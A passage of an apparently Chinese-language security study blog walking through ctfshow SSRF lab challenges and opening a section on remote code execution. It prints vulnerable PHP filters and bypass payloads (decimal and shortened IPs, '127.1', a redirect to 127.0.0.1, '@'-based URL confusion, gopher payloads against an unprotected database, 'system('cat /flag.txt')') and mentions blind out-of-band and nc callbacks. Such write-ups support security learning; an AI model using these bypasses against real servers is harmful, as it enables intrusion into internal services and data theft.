class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]**=<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]=**<span class=\"string\">&#x27;https&#x27;</span>)&#123;  </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/localhost|127\\.0\\.|\\。/i&#x27;</span>, <span class=\"variable\">$url</span>))&#123;  </span><br><span class=\"line\">\t\t<span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);  </span><br><span class=\"line\">\t\t<span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">\t    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里和之前一样，先判断是否是 <code>http</code> 或者 <code>https</code> 协议</p>\n</li>\n<li>\n<p>然后再正则匹配，不能包含 <code>localhost</code>、<code>127.0.</code>、<code>。</code> 字段，并且转为小写匹配</p>\n</li>\n<li>\n<p>那我们继续用十进制来进行绕过</p>\n</li>\n<li>\n<p>进制转换网站：<a href=\"https://www.zhanid.com/tool/ipconvert.html\">IP 地址转换器_IP 地址转二进制、十进制、十六进制工具 - 站长工具网</a></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902162924227.png\" alt=\"image-20250902162924227\"></p>\n</li>\n</ul>\n<p><strong>Web354</strong></p>\n<ul>\n<li>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]**=<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]=**<span class=\"string\">&#x27;https&#x27;</span>)&#123;  </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class=\"variable\">$url</span>))&#123;  </span><br><span class=\"line\">\t\t<span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);  </span><br><span class=\"line\">\t\t<span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">\t    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>同样，先要包含 <code>http</code> 或 <code>https</code> 的头，然后过滤掉了 <code>localhost</code>、<code>0</code>、<code>1</code>、<code>。</code> 字段</p>\n</li>\n<li>\n<p>这里我们就不能使用进制转换来进行绕过，但是我们可以使用短网址来进行绕过</p>\n</li>\n<li>\n<p>将 <code>http://127.0.0.1</code> 解析为一个域名即可绕过，可以在网上找短网址生成但记住不要有 0 和 1，也可以选择在阿里云自己整一个</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902163412129.png\" alt=\"image-20250902163412129\"></p>\n</li>\n<li>\n<p>这里不知道为什么解析失败了，我们自己重新整一个</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902163446053.png\" alt=\"image-20250902163446053\"></p>\n</li>\n<li>\n<p>最后成功绕过</p>\n</li>\n</ul>\n<p><strong>Web355</strong></p>\n<ul>\n<li>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]**=<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]=**<span class=\"string\">&#x27;https&#x27;</span>)&#123;  </span><br><span class=\"line\">\t<span class=\"variable\">$host</span>=<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;host&#x27;</span>];  </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>((<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$host</span>)&lt;=<span class=\"number\">5</span>))&#123;  </span><br><span class=\"line\">\t\t<span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);  </span><br><span class=\"line\">\t\t<span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">\t    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>题目要求 <code>host</code> 的长度小于 5，那我们之前的短网址也不行了</p>\n</li>\n<li>\n<p>我们可以通过他的解析规则策略来进行绕过，比如可以通过 <code>127.1</code>、<code>0</code>，或者 <code>[::]</code> 进行解析，可以自己 ping 下，这样的写法是可以解析成 <code>127.0.0.1</code></p>\n</li>\n<li>\n<p>这里我们选择 <code>127.1</code> 来进行绕过</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902164206823.png\" alt=\"image-20250902164206823\"></p>\n</li>\n</ul>\n<p><strong>Web356</strong></p>\n<ul>\n<li>\n<p>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]**=<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]=**<span class=\"string\">&#x27;https&#x27;</span>)&#123;  </span><br><span class=\"line\">\t<span class=\"variable\">$host</span>=<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;host&#x27;</span>];  </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>((<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$host</span>)&lt;=<span class=\"number\">3</span>))&#123;  </span><br><span class=\"line\">\t\t<span class=\"variable\">$ch</span>=<span class=\"title function_ invoke__\">curl_init</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_setopt</span>(<span class=\"variable\">$ch</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);  </span><br><span class=\"line\">\t\t<span class=\"variable\">$result</span>=<span class=\"title function_ invoke__\">curl_exec</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"title function_ invoke__\">curl_close</span>(<span class=\"variable\">$ch</span>);  </span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> (<span class=\"variable\">$result</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">\t    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>同样，开头是 <code>http</code> 或 <code>https</code>，然后这里比上一关限制得更严格，长度必须小于 3</p>\n</li>\n<li>\n<p>那我们这里选择 <code>0</code> 来进行绕过</p>\n</li>\n</ul>\n<p><strong>Web357</strong></p>\n<ul>\n<li>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]**=<span class=\"string\">&#x27;http&#x27;</span>||<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;scheme&#x27;</span>]=**<span class=\"string\">&#x27;https&#x27;</span>)&#123;  </span><br><span class=\"line\">\t<span class=\"variable\">$ip</span> = <span class=\"title function_ invoke__\">gethostbyname</span>(<span class=\"variable\">$x</span>[<span class=\"string\">&#x27;host&#x27;</span>]);  </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;/br&gt;&#x27;</span>.<span class=\"variable\">$ip</span>.<span class=\"string\">&#x27;&lt;/br&gt;&#x27;</span>;  </span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">filter_var</span>(<span class=\"variable\">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;  </span><br><span class=\"line\">\t    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;ip!&#x27;</span>);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>]);  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;scheme&#x27;</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>首先还是开头是 <code>http</code> 或者 <code>https</code>，然后它这里使用了一个 <code>gethostbyname()</code> 的函数，这个函数的作用就是去解析域名然后得到 <code>ip</code> 地址，然后再将这个 <code>ip</code> 地址进行一个过滤</p>\n</li>\n<li>\n<p>过滤规则我们不清楚，但是可以猜到他过滤了一些特殊 ip，那我们就没办法在用直接解析成 <code>127.0.0.1</code> 的写法了</p>\n</li>\n<li>\n<p>由于他是只过滤了一次，我们可以使用重定向让他第一次解析到的 ip 是合法的，但这个网站会跳转到 <code>127.0.0.1</code></p>\n</li>\n<li>\n<p>我们在自己的服务器搭建这样一个网站内容是</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>然后我们访问我们的服务器，成功得到 <code>flag</code>：</p>\n</li>\n</ul>\n<p><strong>Web358</strong></p>\n<ul>\n<li>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$url</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;url&#x27;</span>];  </span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"title function_ invoke__\">parse_url</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;</span>,<span class=\"variable\">$url</span>))&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$url</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里判定需要我们输入的 <code>url</code> 起始位置（<code>^</code>）必须是 <code>http://</code>，然后 <code>host</code> 位置必须以 <code>ctf.</code> 开始，中间是 <code>.*</code> 是通配符，表示匹配任意字符，最后必须以 <code>show</code> 结尾（<code>$</code>）</p>\n</li>\n<li>\n<p>翻译一下就是我们的 <code>payload</code> 必须是 <code>http://ctf.(xxxx)show</code> 的形式</p>\n</li>\n<li>\n<p>那么这里我们应该怎么绕过呢？我们可以利用之前提到的，通过一些特定的字符，让 URL 解析混乱</p>\n</li>\n<li>\n<p>比如在 <code>URL</code> 中 <strong><code>@</code> 字符表示前面是用户信息，后面才是实际的解析主机地址</strong>；<code>#</code> 后面的信息表示片段名，这个在 DOM-XSS 那节见过</p>\n</li>\n<li>\n<p>那我们就可以写出如下 <code>payload</code> 来绕过 <code>url=http://ctf.@127.0.0.1/flag.php#show</code></p>\n</li>\n</ul>\n<p><strong>Web359-360</strong></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902165940108.png\" alt=\"image-20250902165940108\"></p>\n<ul>\n<li>\n<p>这个题没有源码，它是一个登录的网页，那我们抓一下包：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902170012945.png\" alt=\"image-20250902170012945\"></p>\n</li>\n<li>\n<p>发现它的参数是 <code>returl</code>，值是一个网址，那这里可能就是我们的 SSRF 注入点</p>\n</li>\n<li>\n<p>这里的话它提示了去攻击无密码的数据库，那就说明要通过这个注入点去连数据库</p>\n</li>\n<li>\n<p>因为我们通过 <code>http</code> 或者 <code>https</code> 协议是没办法访问数据库的，所以只能通过其他协议，那 <code>gopher://</code> 协议就是做这种事情的，我们可以通过该协议去与数据库通信</p>\n</li>\n<li>\n<p>这里可以使用一个工具 <code>gopherus</code> 去帮我们生成利用的 <code>payload</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902170206914.png\" alt=\"image-20250902170206914\"></p>\n</li>\n<li>\n<p>这里就不用纠结怎么知道路径啊，这些问题了，就理解体会一下这个协议的用法就可以了</p>\n</li>\n<li>\n<p>因为实战中一般遇不到没有密码的数据库，<code>Redis</code> 还有可能存在匿名登录</p>\n</li>\n<li>\n<p>由于我们的 payload 会被网站进行一次解码，所以这里我们要进行一次 <code>URL</code> 编码，保证 <code>payload</code> 的作用</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902170419481.png\" alt=\"image-20250902170419481\"></p>\n</li>\n<li>\n<p>然后访问 <code>x.php</code>，正常的命令执行就行，这里我们直接 POST 传入参数 <code>x=system('cat /flag.txt')</code> 得到 <code>flag</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250902170609897.png\" alt=\"image-20250902170609897\"></p>\n</li>\n</ul>\n<h6 id=\"无回显的-SSRF\">无回显的 SSRF</h6>\n<p><strong>如何利用</strong></p>\n<ul>\n<li>前面讲的都是有回显的 SSRF，但是有些时候 SSRF 利用是没有回显的</li>\n<li>那这时候应该怎么办呢？我们应对无回显的东西，无论是 <code>RCE</code> 还是 <code>SQL</code> 注入，亦或者是今天的 <code>SSRF</code>，都有下面几种思路：\n<ul>\n<li><strong>DnsLog 尝试带外</strong></li>\n<li><strong>正向连接</strong>：尝试让对方开启 nc 之类的东西，然后我们去连接</li>\n<li><strong>反向连接</strong>：本地开个 nc 或者服务器，让对方来连接/访问</li>\n<li>如果能上传文件，可以创建个文件然后看能否访问</li>\n</ul>\n</li>\n<li>比如一些在线编辑 <code>PDF</code>、<code>Word</code>、<code>Excel</code> 的网站，有些它是会解析里面的内容的，但是它不会回显</li>\n</ul>\n<h3 id=\"RCE-命令执行漏洞\">RCE 命令执行漏洞</h3>\n<h4 id=\"一、基础知识-4\">一、基础知识</h4>\n<h5 id=\"原理-8\">原理</h5>\n<ul>\n<li>RCE（Remote Code Execution，远程代码执行）是指攻击者通过漏洞在目标服务器或应用程序上执行 <strong>任意代码或系统命令</strong> 的漏洞类型。其核心原理是 <strong>应用程序对用户输入的处理存在安全缺陷</strong>，导致攻击者可控的输入被当作代码或命令执行。</li>\n<li>而根据使用的 <strong>函数不同</strong>，RCE 又可以分为命令注入和代码注入</li>\n</ul>\n<h5 id=\"命令注入\">命令注入</h5>\n<ul>\n<li>\n<p>代码使用 <strong>可以调用系统命令的函数</strong>，并且传入的参数可控，造成任意命令执行</p>\n</li>\n<li>\n<p><strong><code>PHP</code> 中的命令执行函数</strong> 有：</p>\n<ul>\n<li>\n<p><strong>直接回显</strong>：<code>system()</code>、<code>passthru()</code>、<code>ob_start()+shell_exec()+ob_get_clean()</code> 联合使用</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903202411569.png\" alt=\"image-20250903202411569\"></p>\n</li>\n<li>\n<p><strong>不直接回显</strong>：<code>exec()</code>、<code>shell_exec()</code>、<code>popen()</code>、<code>proc_open()</code>、<code>proc_get_status()</code>、<code>pcntl_exec()</code>、<code>posix_spawn()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903202454478.png\" alt=\"image-20250903202454478\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>Java</code> 中的命令执行类/方法</strong>（都不直接回显）有：</p>\n<ul>\n<li>\n<p><strong>常见</strong>：<code>Runtime.getRuntime.exec()</code>、<code>ProcessBuilder.start()</code>、<code>Process.getInputStream()</code>、<code>Process.getErrorStream()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903202701363.png\" alt=\"image-20250903202701363\"></p>\n</li>\n<li>\n<p><strong>不常见</strong>：<code>ScriptEngine.eval()</code>、<code>JNI调用</code>、<code>ProcessImpl.start()</code>、<code>反射利用</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903202726632.png\" alt=\"image-20250903202726632\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>Python</code> 中的命令执行函数</strong> 有：</p>\n<ul>\n<li>\n<p><strong>直接回显</strong>：<code>os.system()</code>、<code>subprocess.call()</code>、<code>subprocess.run()</code>、<code>pty.spawn()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903202813961.png\" alt=\"image-20250903202813961\"></p>\n</li>\n<li>\n<p><strong>不直接回显</strong>：<code>os.popen().read()</code>、<code>subprocess.check_output()</code>、<code>commands.getoutput()</code>、<code>eval()</code>、<code>exec()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903202904432.png\" alt=\"image-20250903202904432\"></p>\n</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"代码执行\">代码执行</h5>\n<ul>\n<li>\n<p>代码使用 <strong>可以执行当前编程语言代码的函数</strong>，并且传入参数可控，造成任意代码执行</p>\n</li>\n<li>\n<p><strong><code>PHP</code> 中的代码执行函数</strong> 有：</p>\n<ul>\n<li>\n<p><strong>直接回显</strong>：<code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、<code>array_map()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903203304452.png\" alt=\"image-20250903203304452\"></p>\n</li>\n<li>\n<p><strong>不直接回显</strong>：<code>preg_replace()</code>、<code>call_user_func()</code>、<code>call_user_func_arry()</code>、<code>ReflectionFunction-&gt;invoke()</code>、<code>eval()</code>、<code>array_filter()</code>、<code>uasort()</code></p>\n<p><img 